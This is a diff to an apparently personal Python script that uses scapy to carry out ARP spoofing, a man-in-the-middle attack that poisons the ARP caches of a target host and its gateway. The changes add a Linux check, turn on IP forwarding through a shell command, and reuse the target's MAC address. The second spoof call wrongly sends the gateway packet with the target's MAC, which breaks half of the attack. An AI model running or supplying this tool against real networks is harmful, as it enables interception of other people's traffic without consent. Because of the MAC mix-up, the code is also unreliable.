@@ -1,5 +1,12 @@
+#!/usr/bin/env python3
 import scapy.all as scapy
-import optparse, time
+import platform, optparse, time, os
+
+def checkOS():
+    if "Linux" in platform.system():
+        return True
+    else:
+        return False
 
 def get_arguments():
     parser = optparse.OptionParser()
@@ -20,8 +27,7 @@ def get_mac(ip):
 
     return answered_list[0][1].hwsrc
 
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
+def spoof(target_mac, target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
@@ -31,21 +37,31 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, verbose=False, count=4)
 
+def ip_forward(num):
+    os.system("echo " + num + " > /proc/sys/net/ipv4/ip_forward")
+
 
 if __name__ == "__main__":
-    options = get_arguments()
-    try:
-        send_packets_count = 0
-        print("[i] Exit: press CTRL + C")
-        while True:
-            spoof(options.target_ip, options.gateway_ip)
-            spoof(options.gateway_ip, options.target_ip)
-            send_packets_count += 2
-            print("\r[+] Packets sent: " + str(send_packets_count), end="")
-            time.sleep(3)
-    except KeyboardInterrupt:
-        print("\n[i] Detected CTRL + C...Resetting ARP tables...Please wait!")
-        restore(options.target_ip, options.gateway_ip)
-        restore(options.gateway_ip, options.target_ip)
-        print("[+] Quitting. Bye")
+    ch = checkOS()
+    if ch:
+        options = get_arguments()
+        try:
+            ip_forward("1")
+            send_packets_count = 0
+            print("[i] Exit: press CTRL + C")
+            target_mac = get_mac(options.target_ip)
+            while True:
+                spoof(target_mac, options.target_ip, options.gateway_ip)
+                spoof(target_mac, options.gateway_ip, options.target_ip)
+                send_packets_count += 2
+                print("\r[+] Packets sent: " + str(send_packets_count), end="")
+                time.sleep(3)
+        except KeyboardInterrupt:
+            print("\n[i] Detected CTRL + C...Resetting ARP tables...Please wait!")
+            restore(options.target_ip, options.gateway_ip)
+            restore(options.gateway_ip, options.target_ip)
+            ip_forward("0")
+            print("[+] Quitting. Bye")
+    else:
+        print("[-] Your OS is not linux!")
 
